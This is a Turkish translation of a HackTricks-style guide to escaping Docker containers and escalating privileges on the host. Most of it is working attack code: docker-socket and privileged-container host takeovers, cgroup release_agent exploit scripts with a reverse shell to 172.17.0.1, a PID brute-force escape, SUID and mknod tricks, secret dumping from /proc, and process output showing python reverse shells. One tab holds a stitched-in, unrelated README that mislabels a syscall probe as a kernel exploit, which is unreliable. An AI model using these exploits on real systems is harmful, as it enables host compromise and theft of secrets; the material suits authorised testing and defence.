# Docker Kaçışı / Ayrıcalık Yükseltme

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Otomatik Numaralandırma ve Kaçış

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Ayrıca **konteynerleri numaralandırabilir**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Bu araç, içinde bulunduğunuz konteyneri numaralandırmak için oldukça **yararlıdır ve hatta otomatik olarak kaçmaya çalışır**
* [**amicontained**](https://github.com/genuinetools/amicontained): Konteynerin sahip olduğu ayrıcalıkları almak için kullanışlı bir araç ve bundan kaçış yollarını bulmak
* [**deepce**](https://github.com/stealthcopter/deepce): Konteynerlerden numaralandırmak ve kaçmak için araç
* [**grype**](https://github.com/anchore/grype): Görüntüye yüklenen yazılımda bulunan CVE'leri alın

## Bağlanmış Docker Soketinden Kaçış

Eğer bir şekilde **docker soketinin** docker konteyneri içine bağlandığını bulursanız, bundan kaçabilirsiniz.\
Bu genellikle, bir nedenle docker işlemlerini gerçekleştirmek için docker daemonına bağlanması gereken docker konteynerlerinde meydana gelir.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Bu durumda, docker daemon ile iletişim kurmak için düzenli docker komutlarını kullanabilirsiniz:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Eğer **docker soketi beklenmedik bir konumda** bulunuyorsa, yine de **`docker`** komutunu **`-H unix:///path/to/docker.sock`** parametresi ile kullanarak iletişim kurabilirsiniz.
{% endhint %}

Docker daemon ayrıca bir portta da dinlenebilir (varsayılan olarak 2375, 2376) veya Systemd tabanlı sistemlerde Docker daemon ile iletişim Systemd soketi `fd://` üzerinden gerçekleşebilir.

{% hint style="info" %}
Ayrıca, diğer yüksek seviye çalışma zamanlarının çalışma soketlerine dikkat edin:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Yeteneklerin Kötüye Kullanımından Kaçınma

Konteynerin yeteneklerini kontrol etmelisiniz, eğer aşağıdaki yeteneklerden herhangi birine sahipse, ondan kaçabilirsiniz: **`CAP_SYS_ADMIN`**, **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Şu anda konteyner yeteneklerini kontrol etmek için **önceden bahsedilen otomatik araçları** veya aşağıdaki komutu kullanabilirsiniz:
```bash
capsh --print
```
Aşağıdaki sayfada **linux yetenekleri** hakkında daha fazla bilgi edinebilir ve bunları kötüye kullanarak ayrıcalıklardan kaçınabilir/aitalabilirsiniz:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Ayrıcalıklı Konteynerden Kaçış

Ayrıcalıklı bir konteyner, `--privileged` bayrağıyla veya belirli savunmaları devre dışı bırakarak oluşturulabilir:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev` bağlama

`--privileged` bayrağı, konteyner güvenliğini önemli ölçüde düşürerek **sınırsız cihaz erişimi** sunar ve **birçok korumayı atlar**. Detaylı bir açıklama için, `--privileged`'ın tam etkileri hakkındaki belgelere başvurun.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Bu izinlerle, sadece **kök olarak çalışan bir işlem alanına geçebilirsiniz** örneğin init (pid:1) gibi, sadece şunu çalıştırarak: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Bunu bir konteynerde test etmek için şunu çalıştırın:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Ayrıcalıklı

Sadece ayrıcalıklı bayrağı ile **ana bilgisayarın diskinde erişmeyi** veya **release\_agent veya diğer kaçışları kötüye kullanarak kaçmayı** deneyebilirsiniz.

Aşağıdaki atlamaları bir konteynerde test etmek için şunları çalıştırın:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Diski Bağlama - Poc1

İyi yapılandırılmış docker konteynerleri **fdisk -l** gibi komutlara izin vermez. Ancak yanlış yapılandırılmış bir docker komutunda `--privileged` veya `--device=/dev/sda1` bayrağı belirtildiğinde, ana sürücüyü görmek için ayrıcalıkları almak mümkündür.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Bu nedenle ana makineyi ele geçirmek basittir:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Ve işte! Artık ana bilgisayarın dosya sistemine `/mnt/hola` klasöründe bağlanabilirsiniz.

#### Disk Bağlama - Poc2

Kapsayıcı içinde, bir saldırgan kümenin oluşturduğu yazılabilir hostPath birimine erişmeye çalışabilir ve bu yolla altta yatan ana işletim sistemine daha fazla erişim sağlamaya çalışabilir. Aşağıda, bu saldırgan vektörünü kullanıp kullanamayacağınızı kontrol etmek için kapsayıcı içinde kontrol edebileceğiniz bazı yaygın şeyler bulunmaktadır:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Yetkilendirilmiş Kaçış Varolan release\_agent Kullanarak ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Başlangıç PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Oluşturulan release_agent'i Kullanarak Ayrıcalıklı Kaçış ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Teknik açıklamasını bulun:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Bilinen yol olmadan release\_agent'i kötüye kullanarak ayrıcalıklı kaçış - PoC3

Önceki saldırılarda **konumun mutlak yolu** ifşa edilmiştir. Bununla birlikte, her zaman böyle olmaz. **Ana bilgisayar içinde konteynerin mutlak yolunu bilmediğiniz durumlarda** bu tekniği kullanabilirsiniz:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
İşlemi ayrıcalıklı bir konteyner içinde gerçekleştirmek, benzer bir çıktı sağlamalıdır:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Ayrıcalıklı Kaçış Hassas Bağlantı Noktalarını Kötüye Kullanma

Altta yatan ana bilgisayar hakkında bilgi veren **çeşitli dosyalar** bağlanabilir. Bazıları, hatta **ana bilgisayarın bir şey gerçekleştiğinde bir şeyi yürütmesini işaret edebilir** (bu da bir saldırganın konteynerden kaçmasına izin verebilir).\
Bu dosyaların kötüye kullanımı şunu mümkün kılar:

* release\_agent (zaten önce ele alındı)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Ancak, bu sayfada kontrol etmek için **diğer hassas dosyaları** bulabilirsiniz:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Keyfi Bağlantı Noktaları

Birkaç durumda, **konteynerin ana bilgisayardan birim bağlandığını** göreceksiniz. Bu birim doğru şekilde yapılandırılmamışsa, **hassas verilere erişebilir/değiştirebilirsiniz**: Gizli bilgileri okuyun, ssh authorized\_keys dosyasını değiştirin...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 kabuk ve ana makine bağlantısı ile ayrıcalık yükseltme

Eğer **bir konteyner içinde root erişiminiz** varsa ve ana makineden bazı klasörler bağlanmışsa ve **ana makinede ayrıcalıklı olmayan bir kullanıcı olarak kaçmayı başardıysanız** ve bağlanmış klasöre okuma erişiminiz varsa.\
**Konteyner** içinde **bağlanmış klasörde** bir **bash suid dosyası** oluşturabilir ve bu dosyayı **ana makineden çalıştırarak** ayrıcalık yükseltebilirsiniz.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 kabuk ile Yetki Yükseltme

Eğer bir konteyner içinde **root erişiminiz varsa** ve **özne olmayan bir kullanıcı olarak ana makineye kaçmayı başardıysanız**, konteyner içinde MKNOD yeteneğine sahipseniz (varsayılan olarak vardır) her iki kabuğu da kötüye kullanarak **ana makinede yetki yükseltebilirsiniz**. Bu yetenekle, konteyner içindeki root kullanıcısına **blok cihaz dosyaları oluşturma izni** verilir. Cihaz dosyaları, **altta yatan donanıma ve çekirdek modüllerine erişmek** için kullanılan özel dosyalardır. Örneğin, /dev/sda blok cihaz dosyası, **sistemin diskindeki ham verileri okuma** izni verir.

Docker, konteynerler içinde blok cihazlarının kötüye kullanımına karşı koruma sağlar, blok cihazı **okuma/yazma işlemlerini engelleyen bir cgroup politikası uygular**. Bununla birlikte, bir blok cihazı **konteyner içinde oluşturulursa**, dışarıdan **/proc/PID/root/** dizini aracılığıyla erişilebilir hale gelir. Bu erişim, iç ve dış konteynerde **işlem sahibinin aynı olmasını** gerektirir.

Bu [**yazıda**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) verilen **sömürü** örneği:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Eğer ana makinenin işlemlerine erişebilirseniz, bu işlemlerde saklanan birçok hassas bilgiye erişebileceksiniz demektir. Test laboratuvarını çalıştırın:
```
docker run --rm -it --pid=host ubuntu bash
```
Örneğin, `ps auxn` gibi bir şey kullanarak süreçleri listeleyebilecek ve komutlardaki hassas detayları arayabileceksiniz.

Ardından, **/proc/ içindeki ana bilgisayarın her sürecine erişebileceğiniz için sadece çevre sırlarını çalabilirsiniz** çalıştırarak:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Ayrıca **diğer işlemlerin dosya tanımlayıcılarına erişebilir ve açık dosyalarını okuyabilirsiniz**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Ayrıca **işlemleri sonlandırabilir ve bir Hizmet Reddine (DoS) neden olabilirsiniz**.

{% hint style="warning" %}
Eğer **konteyner dışındaki bir işlem üzerinde ayrıcalıklı erişiminiz varsa**, `nsenter --target <pid> --all` veya `nsenter --target <pid> --mount --net --pid --cgroup` gibi bir şey çalıştırabilir ve **umarım olmayan** aynı ns kısıtlamalarına sahip bir kabuk çalıştırabilirsiniz.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Eğer bir konteyner Docker [ana ağ sürücüsüyle yapılandırılmışsa (`--network=host`)](https://docs.docker.com/network/host/), o konteynerin ağ yığını Docker ana bilgisayarından izole edilmez (konteyner ana bilgisayarın ağ ad alanını paylaşır) ve konteynere ayrı bir IP adresi atanmaz. Başka bir deyişle, **konteyner tüm hizmetleri doğrudan ana bilgisayarın IP'sine bağlar**. Ayrıca konteyner, paylaşılan arayüz üzerinde ana bilgisayarın gönderdiği ve aldığı **TÜM ağ trafiğini yakalayabilir** `tcpdump -i eth0`.

Örneğin, bunu kullanarak ana bilgisayar ve meta veri örneği arasındaki trafiği **dinleyebilir ve hatta sahtekarlık yapabilirsiniz**.

Aşağıdaki örneklerde olduğu gibi:

* [Açıklama: Google SRE ile nasıl iletişime geçilir: Bulut SQL'de bir kabuk bırakma](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Meta veri servisi MITM, kök ayrıcalık yükseltmesine izin verir (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Ayrıca ana bilgisayar içinde **localhost'a bağlı ağ hizmetlerine erişebilecek** veya hatta **düğümün meta veri izinlerine** erişebileceksiniz (bu, bir konteynerin erişebileceğinden farklı olabilir). 

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
`hostIPC=true` ile, ana bilgisayarın ara işlem iletişimi (IPC) kaynaklarına, örneğin `/dev/shm` içindeki **paylaşılan bellek** gibi, erişim elde edersiniz. Bu, aynı IPC kaynaklarının diğer ana bilgisayar veya kapsül süreçleri tarafından kullanıldığı yerlerde okuma/yazma yapmanıza olanak tanır. Bu IPC mekanizmalarını daha ayrıntılı incelemek için `ipcs` komutunu kullanın.

* **/dev/shm'yi İnceleyin** - Bu paylaşılan bellek konumunda herhangi bir dosyayı arayın: `ls -la /dev/shm`
* **Mevcut IPC tesislerini İnceleyin** - `/usr/bin/ipcs` ile herhangi bir IPC tesisinin kullanılıp kullanılmadığını kontrol edebilirsiniz. Şunu kontrol edin: `ipcs -a`

### Yetenekleri Kurtarın

Eğer **`unshare`** sistem çağrısı yasaklanmamışsa, tüm yetenekleri kurtarabilirsiniz:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Kullanıcı ad alanı kötüye kullanımı simge bağlantısı aracılığıyla

[https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) adresinde açıklanan ikinci teknik, kullanıcı ad alanlarıyla bağlantılı bağ montajlarını kötüye kullanarak ana makinedeki dosyaları etkilemenize (belirli bir durumda dosyaları silmenize) olanak tanır.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını otomatikleştirin** ve **kolayca oluşturun**.\
Hemen Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE'ler

### Runc açığı (CVE-2019-5736)

Eğer kök olarak `docker exec` komutunu çalıştırabiliyorsanız (muhtemelen sudo ile), CVE-2019-5736'ı kötüye kullanarak ayrıcalıkları yükseltmeyi deneyebilirsiniz (saldırı [burada](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Bu teknik temelde **ana makinedeki** _**/bin/sh**_ ikilisini **bir konteynerden üzerine yazacak**, böylece docker exec komutunu çalıştıran herkes saldırıyı tetikleyebilir.

Payload'ı değiştirin ve `go build main.go` ile main.go dosyasını derleyin. Oluşan ikili dosya, yürütme için docker konteynerine yerleştirilmelidir.\
Yürütme sırasında, `[+] Overwritten /bin/sh successfully` mesajını görüntülediğinde, aşağıdakini ana makineden çalıştırmanız gerekmektedir:

`docker exec -it <container-adı> /bin/sh`

Bu, main.go dosyasında bulunan saldırıyı tetikleyecektir.

Daha fazla bilgi için: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Konteynerin savunmasız olabileceği diğer CVE'ler bulunmaktadır, bir liste [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) adresinde bulunabilir.
{% endhint %}

## Docker Özel Kaçış

### Docker Kaçış Yüzeyi

* **Ad alanları:** İşlem, ad alanları aracılığıyla diğer işlemlerden **tamamen ayrılmış olmalıdır**, bu nedenle ad alanları nedeniyle diğer işlemlerle etkileşimden kaçınamayız (varsayılan olarak IPC'ler, unix soketleri, ağ hizmetleri, D-Bus, diğer işlemlerin `/proc`'si aracılığıyla iletişim kurulamaz).
* **Kök kullanıcı**: Varsayılan olarak işlemi çalıştıran kullanıcı kök kullanıcıdır (ancak ayrıcalıkları sınırlıdır).
* **Yetenekler**: Docker, aşağıdaki yetenekleri bırakır: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscall'ler**: Bunlar, **kök kullanıcının** çağırabileceği syscall'lerdir (yetenek eksikliği + Seccomp nedeniyle çağrılamayanlar). Kaçmaya çalışmak için diğer syscall'ler kullanılabilir.

{% tabs %}
{% tab title="x64 syscall'ler" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 sistem çağrıları" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}Docker Breakout Privilege Escalation
===============================

This directory contains a Docker breakout exploit that leverages a bug in the Linux kernel to escalate privileges within a Docker container.

### Usage

Compile the exploit code using the provided Makefile:

```bash
make
```

Run the exploit:

```bash
./syscall_bf
```

### Disclaimer

This exploit is for educational purposes only. Misuse of this exploit on unauthorized systems is illegal.
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
